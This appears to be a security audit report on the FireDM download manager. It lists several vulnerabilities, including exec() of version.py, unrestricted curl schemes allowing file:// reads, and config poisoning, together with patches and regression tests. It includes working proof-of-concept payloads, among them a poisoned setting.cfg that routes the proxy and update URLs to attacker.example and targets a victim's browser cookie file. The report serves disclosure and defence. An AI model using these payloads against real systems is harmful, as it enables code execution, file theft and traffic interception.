## FINDING F-CRIT-1: Arbitrary Python execution via `version.py` `exec()`

**Severity:** Critical
**Category:** Arbitrary Code Execution
**File:** `firedm/utils.py`
**Function:** `get_pkg_version`
**Lines (pre-patch):** 1196–1207

### Description

`get_pkg_version` reads `<pkg_path>/version.py` and runs it through `exec(txt, version_module)`.
Any actor able to write into a third-party site-packages folder (`yt_dlp`, `youtube_dl`,
`firedm`, `awesometkinter`) — typical case: pip-user installs in `~/.local/...` or `%APPDATA%\Python\...`
which are user-writable — drops a malicious `version.py` and gains ACE inside the FireDM
process the next time `Controller.check_for_update` / `auto_check_for_update` runs, which
fires `get_pkg_version("youtube_dl")` and `get_pkg_version("yt_dlp")` at controller construction
(`firedm/controller.py:1066,1069`).

### Root Cause

`exec()` on attacker-controlled file content. The fallback regex was already capable of
extracting the version literal — `exec()` was never necessary.

### Proof of Concept (VERIFIED)

```python
# Stages a fake site-packages entry with a hostile version.py and shows ACE
pkg_dir/'version.py'.write_text(
    "__version__ = '0.0.1'\n"
    "import os\n"
    "open('/tmp/PWN', 'w').write('PWNED_BY_VERSION_PY_EXEC')\n"
)
sys.path.insert(0, pkg_root)
from firedm.utils import get_pkg_version
get_pkg_version("evilpkg")     # exec runs the import + write
assert open('/tmp/PWN').read() == 'PWNED_BY_VERSION_PY_EXEC'
```

Pre-patch run produced `VULN_EXEC_VERSION_PY: PWNED_BY_VERSION_PY_EXEC`.

### Impact

Local privilege escalation / persistence: any process that can drop a file at
`<site-packages>/<pkg>/version.py` controls FireDM on next launch. Typical preconditions
are *user-level* writes only, not root.

### Patch

`exec()` replaced by an `ast.parse` pass that only accepts a literal `__version__ = "..."`
string assignment (`firedm/utils.py` after the patch). The legacy regex fallback is kept
for `version.pyc` / odd formats but never runs untrusted code.

### Regression Test

`tests/test_security.py::test_get_pkg_version_does_not_exec_version_py` — fails pre-patch
(`ACE_MARKER.txt` exists), passes post-patch.

## FINDING F-CRIT-2: SSRF / arbitrary local-file read via unrestricted pycurl protocols

**Severity:** Critical
**Category:** SSRF / Info Disclosure
**File:** `firedm/utils.py`
**Function:** `set_curl_options`, `download`, `get_headers`
**Lines (pre-patch):** 124–125 (FOLLOWLOCATION + MAXREDIRS) plus the absence of a `PROTOCOLS`
allowlist anywhere in `set_curl_options`.

### Description

The verified Windows libcurl build supports `dict / file / ftp / ftps / gopher / gophers /
http / https / imap / imaps / mqtt / pop3 / pop3s / rtsp / scp / sftp / smb / smbs / smtp /
smtps / telnet / tftp` (verified via `pycurl.version_info()[8]`). `set_curl_options` does
not call `setopt(PROTOCOLS, ...)` or `setopt(REDIR_PROTOCOLS, ...)`, so any URL handed to
`utils.download()` / `utils.get_headers()` is dispatched at the libcurl scheme layer.
`FOLLOWLOCATION=1` + `MAXREDIRS=10` means a hostile HTTP server can redirect to `file:///`
(or `gopher://internal:11211/_set foo bar`, or `dict://memcache:11211/...`) and the libcurl
worker carries through.

### Root Cause

Missing scheme allowlist on the pycurl handle. Plus no Python-level scheme validation in
`download()` / `get_headers()`.

### Proof of Concept (VERIFIED)

```python
import urllib.parse, tempfile, os
from firedm.utils import download
fd, sentinel = tempfile.mkstemp()
os.write(fd, b"SECRET_DATA"); os.close(fd)
url = "file:///" + urllib.parse.quote(sentinel.replace(os.sep, "/").lstrip("/"))
data = download(url, decode=True, verbose=False)
assert "SECRET_DATA" in data    # <-- pre-patch
```

Pre-patch run printed `download() returned: 'LEAK_VIA_FIREDM_DOWNLOAD'`.

### Impact

Hostile yt-dlp metadata, hostile m3u8 manifests, hostile HTTP redirects all become
arbitrary local-file reads (and, via `gopher`/`dict`/`smb`, internal-service hits).
Combines with F-HIGH-5 to write the leaked file to a `<video>.png` next to a download.

### Patch

`set_curl_options` now sets `PROTOCOLS = REDIR_PROTOCOLS = PROTO_HTTP | PROTO_HTTPS`.
`download()` and `get_headers()` also pre-validate the URL via a new `is_allowed_network_url`
helper — defense in depth so a future caller bypassing the curl handle still gets blocked.

### Regression Tests

* `test_download_refuses_file_scheme` — proves a `file://` URL no longer leaks file content.
* `test_download_refuses_ftp_scheme` — proves non-HTTP schemes are rejected before pycurl.

## FINDING F-CRIT-3: Schema-free config poisoning via `setting.cfg`

**Severity:** Critical
**Category:** Config Poisoning / RCE precondition
**File:** `firedm/setting.py`
**Function:** `load_setting`
**Lines (pre-patch):** 161

### Description

`load_setting()` blindly executed `config.__dict__.update(settings)` on the JSON read from
`<sett_folder>/setting.cfg`. This (a) added arbitrary new attributes to the `config` module
with no restriction, and (b) overrode trusted constants such as `APP_URL`,
`LATEST_RELEASE_URL`, `FFMPEG_DOWNLOAD_HELP_URL`, `ffmpeg_actual_path`, `cookie_file_path`,
`proxy`, `on_completion_command`, etc.

### Root Cause

No schema validation on a file the OS allows the local user to overwrite (hence any malware
running with the user's privileges can poison it).

### Proof of Concept (VERIFIED)

```python
poisoned = {
    "ffmpeg_actual_path": r"C:\AttackerControlled\trojan_ffmpeg.exe",
    "on_completion_command": "calc.exe",
    "proxy": "http://attacker.example:8080",
    "log_popup_callback": "__INJECTED_NEW_ATTR__",
    "APP_URL": "https://attacker.example/firedm",
    "LATEST_RELEASE_URL": "https://attacker.example/release",
    "cookie_file_path": r"C:\users\victim\AppData\Roaming\Mozilla\cookies.sqlite",
}
open(sett_folder + '/setting.cfg', 'w').write(json.dumps(poisoned))
setting.load_setting()
# All of the above attributes get applied verbatim to firedm.config
```

Pre-patch all `VULN_CONFIG_POISON_*` flags returned True, including the override of
`config.APP_URL` and the injection of `log_popup_callback` (which had never been declared
on the config module).

### Impact

Once the file is poisoned the attacker can:

* Override `ffmpeg_actual_path` → trojan binary executes on every video merge (`run_ffmpeg`).
* Override `on_completion_command` → arbitrary command runs after every batch via
  `_on_completion_watchdog` (`firedm/controller.py:1561`).
* Override `proxy` → MITM / exfiltrate every download.
* Override `cookie_file_path` → siphon arbitrary cookie jar.
* Override `APP_URL` / `LATEST_RELEASE_URL` → next update install pulls a malicious wheel.

### Patch

`load_setting()` now filters `settings` against `set(config.settings_keys)` and emits a
log line for any dropped key. Unknown keys can no longer create new attributes; trusted
constants are no longer reachable via this surface.

### Regression Tests

* `test_load_setting_drops_unknown_keys` — proves injection + override are blocked.
* `test_load_setting_keeps_legitimate_keys` — proves declared keys still apply.

## FINDING F-HIGH-4: `downloads.dat` poisoning seeds `on_completion_command` / `shutdown_pc`

**Severity:** High
**Category:** ACE / Privilege escalation
**File:** `firedm/setting.py`
**Function:** `load_d_map`
**Lines (pre-patch):** 63–67

### Description

`load_d_map()` iterates the JSON in `downloads.dat` and calls `update_object(model.ObservableDownloadItem(), d_dict)`.
`update_object` (in `firedm/utils.py`) sets every key it finds on the object as long as
`hasattr(obj, k)` returns True. `ObservableDownloadItem` exposes both `on_completion_command`
and `shutdown_pc` as legitimate runtime attributes, so a hostile `downloads.dat` that adds
those keys (they are NOT part of the saved-to-disk schema in `DownloadItem.saved_properties`)
gets them seeded on every load. `Controller._post_download` later runs
`run_command(d.on_completion_command)` with no confirmation when the matching item completes
or is resumed; `shutdown_pc=True` triggers a system shutdown.

### Root Cause

`update_object` enforces no allowlist on `d_dict.keys()`. `saved_properties` is the
*producer* schema, not the *consumer* schema.

### Proof of Concept (VERIFIED via test)

`tests/test_security.py::test_load_d_map_strips_on_completion_command` — pre-patch the
loaded item's `on_completion_command` is `"calc.exe"` and `shutdown_pc is True`.

### Impact

A malicious `downloads.dat` (writable by the same user, often dropped by other malware as
a persistence beacon) achieves command execution / system shutdown the next time the
victim resumes the matching item.

### Patch

`load_d_map()` strips `on_completion_command` and `shutdown_pc` from each `d_dict` before
calling `update_object`. These remain modifiable at runtime (GUI flow), but disk poisoning
no longer seeds them.

### Regression Test

`test_load_d_map_strips_on_completion_command` — verifies both keys are scrubbed.

## FINDING F-HIGH-5: `download_thumbnail` accepts arbitrary URL scheme

**Severity:** High
**Category:** SSRF / Info Disclosure
**File:** `firedm/controller.py`
**Function:** `download_thumbnail`
**Lines (pre-patch):** 174–175

### Description

`download_thumbnail` reads `d.thumbnail_url` (populated from yt-dlp metadata) and forwards
it to `download(d.thumbnail_url, fp=fp, decode=False)`. With F-CRIT-2 in scope, a hostile
website can supply `thumbnail_url=file:///c:/users/victim/secret.txt`, and FireDM writes
the local file contents to `<video>.png` next to the downloaded video.

### Proof of Concept (VERIFIED)

Pre-patch the test wrote `THUMB_LEAK` (the contents of a sentinel file) into the resulting
`victim_video.png`.

### Impact

Combined with F-CRIT-2 this is silent local-file exfiltration triggered by any video
download from an attacker-controlled site / a poisoned playlist entry.

### Patch

`download_thumbnail` now imports `is_allowed_network_url` and bails out before calling
`download()` if the scheme is anything other than `http`/`https`. Belt-and-braces: the
F-CRIT-2 pycurl PROTOCOLS allowlist would already reject the URL at libcurl level.

### Regression Test

`test_download_thumbnail_refuses_file_scheme` — verifies the PNG is no longer written.

## FINDING F-HIGH-6: `load_user_extractors` auto-execs every `.py` in user-writable folder

**Severity:** High
**Category:** ACE
**File:** `firedm/video.py`
**Function:** `load_user_extractors`
**Lines (pre-patch):** 787–822

### Description

`load_user_extractors()` enumerates `<sett_folder>/extractors/*.py` and calls
`import_file(fp)`, which runs `spec.loader.exec_module(module)` — i.e. it executes the
module body. The folder lives in the user's AppData / `~/.config`. Any actor able to
write a single `.py` file there gets ACE on the next FireDM launch (extractor-engine
loader runs on a daemon thread during controller construction).

### Proof of Concept (VERIFIED via test)

`tests/test_security.py::test_load_user_extractors_requires_explicit_opt_in` — pre-patch
the marker file is created by the dropped `evil.py`.

### Impact

Malware running with the user's privileges drops a single 5-line `evil.py`, gets persistent
code execution inside FireDM (which itself can reach network / clipboard / filesystem).

### Patch

The loader is now gated behind a new `config.allow_user_extractors` flag (added to
`config.settings_keys` so it can still be opted-in via `setting.cfg`). Default: `False`.
Operators who maintain trusted plugins set the flag explicitly.

### Regression Test

`test_load_user_extractors_requires_explicit_opt_in`.

## Open / Documented (NOT auto-patched in this pass)

### F-MED-7: ffmpeg argv built via f-string + `shlex.split` with attacker-influenced folder path

**Files:** `firedm/video.py::write_metadata` line ~1453, `firedm/brain.py:275`
**Status:** OBSERVED, not VERIFIED end-to-end.

`d.target_file = os.path.join(d.folder, d.name)`. `d.name` is sanitised via
`validate_file_name` (strips quotes / `<>:"/\|?*`) but `d.folder` is not. The command
strings are built with `f'"{ffmpeg}" ... -i "{input_file}" "{output_file}"'` and parsed
through `shlex.split`. A folder path containing `"` would break out of the quoted
argument and inject arbitrary ffmpeg flags (`-i /etc/passwd`, `-vf` filter chains writing
elsewhere, etc.). On Windows `"` is an invalid path char so this is largely Linux-only;
on Linux folder names with `"` are valid.

**Recommended fix (deferred — needs a wider rewrite):** drop the f-string commands and
build `cmd_argv` as a list directly, then call `subprocess.Popen(cmd_argv, shell=False)`
without ever round-tripping through a string. The existing `ffmpeg_commands.py` helpers
should be the single producer of argv lists.

### F-MED-8: Unbounded `io.BytesIO()` buffer in `download()`

**File:** `firedm/utils.py::download`
**Status:** OBSERVED.

`download()` writes the full response into a `BytesIO()` with no `MAX_FILESIZE_LARGE` and
no streaming cap. A malicious server returning `Content-Length: 9999999999` or an unbounded
chunked stream exhausts memory. Mostly affects the auxiliary callers (`download_thumbnail`,
m3u8 sub-download, change-log fetch); the segmented downloader uses the worker pipeline
and is not in this hot path. Trivial DoS but no privilege impact.

**Recommended fix (deferred):** set `pycurl.MAXFILESIZE_LARGE` (e.g. 32 MiB for thumbnails
/ change-logs / m3u8 docs); refuse responses bigger than that via the WRITE callback.

### F-LOW-9: TOCTOU between `os.path.isfile` and `open` in `_pre_download_checks`

**File:** `firedm/controller.py::_pre_download_checks` lines 770–775
**Status:** OBSERVED.

Test-file write/delete sequence is racy on Linux (symlink swap between check and open).
Practical exploitability is low because the folder is the user's own download folder; an
attacker who can write there can already write the file directly. Listed for completeness
because the hostile-audit checklist asks for it.

**Recommended fix (deferred):** open with `os.open(path, os.O_WRONLY | os.O_CREAT |
os.O_EXCL | os.O_NOFOLLOW)` and fall back to a per-call random suffix.

## Architecture Hardening Recommendations

1. **Schema-validated config object.** Replace the `config` module's `__dict__` mutation
   model with a typed `Settings` dataclass so any future loader path is forced to declare
   the schema. F-CRIT-3 was a foreseeable consequence of free-form dict mutation.
2. **Pure-argv ffmpeg invocation.** Eliminate every f-string-built command in
   `firedm/video.py` and `firedm/brain.py` (F-MED-7); standardise on the `ffmpeg_commands.py`
   helpers which already structure inputs.
3. **No `exec()` on disk content.** `get_pkg_version` is the obvious offender; audit
   `import_file` callers (currently `load_user_extractors`) for the same pattern.
4. **Trust boundary at network layer.** A small `network.py` wrapper that owns
   `is_allowed_network_url`, the pycurl `PROTOCOLS` allowlist, and a max-size cap would
   unify F-CRIT-2 / F-HIGH-5 / F-MED-8 instead of relying on every caller to remember.
